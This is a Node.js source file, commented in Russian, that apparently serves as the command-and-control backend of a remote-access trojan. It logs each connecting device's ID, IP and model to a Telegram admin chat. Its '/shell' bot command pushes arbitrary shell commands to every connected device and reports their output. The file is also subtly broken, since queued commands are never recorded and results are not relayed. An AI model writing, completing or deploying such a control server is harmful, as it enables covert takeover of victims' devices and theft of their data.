const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');

const clients = new Map();
const commandQueue = new Map();

module.exports.setupWSConnection = (server, bot) => {
  const wss = new WebSocket.Server({ server });

  wss.on('connection', (ws, req) => {
    const deviceId = uuidv4();
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    clients.set(deviceId, {
      ws,
      ip,
      device: {},
      lastSeen: Date.now()
    });
    
    // Уведомляем админа о подключении
    bot.sendMessage(process.env.ADMIN_CHAT_ID, 
      `📱 Новое устройство подключено!\n\n` +
      `🔑 ID: ${deviceId}\n` +
      `🌐 IP: ${ip}\n`
    );
    
    ws.on('message', (message) => {
      try {
        // ПРОСТОЙ ТЕКСТ, без расшифровки
        const data = JSON.parse(message.toString());
        
        if (data.type === 'device_info') {
          const client = clients.get(deviceId);
          if (client) client.device = data.info;
          bot.sendMessage(process.env.ADMIN_CHAT_ID, `✅ Модель: ${data.info.model}`);
        } 
        else if (data.type === 'command_result') {
          const command = commandQueue.get(data.commandId);
          if (command) {
            commandQueue.delete(data.commandId);
            bot.sendMessage(process.env.ADMIN_CHAT_ID, `Результат команды:\n${data.result}`);
          }
        }
      } catch (e) {
        console.error('Error parsing message:', e);
      }
    });
    
    ws.on('close', () => {
      clients.delete(deviceId);
      bot.sendMessage(process.env.ADMIN_CHAT_ID, `📴 Устройство отключилось.`);
    });
  });

  // Обработка команд от бота
  bot.on('message', (msg) => {
    if (msg.chat.id.toString() !== process.env.ADMIN_CHAT_ID) return;
    
    if (msg.text === '/devices') {
      if (clients.size === 0) {
        bot.sendMessage(process.env.ADMIN_CHAT_ID, 'Устройств пока нет.');
      } else {
        let list = 'Подключенные устройства:\n';
        for (const [id, client] of clients) {
          list += `- ${client.device.model || 'Unknown'} (${client.ip})\n`;
        }
        bot.sendMessage(process.env.ADMIN_CHAT_ID, list);
      }
    }
    else if (msg.text.startsWith('/shell ')) {
      const cmd = msg.text.substring(7);
      let sent = false;
      for (const [id, client] of clients) {
        client.ws.send(JSON.stringify({
          type: 'command',
          id: Date.now().toString(),
          payload: { type: 'shell', command: cmd }
        }));
        sent = true;
      }
      bot.sendMessage(process.env.ADMIN_CHAT_ID, sent ? 'Команда отправлена.' : 'Нет устройств.');
    }
  });
};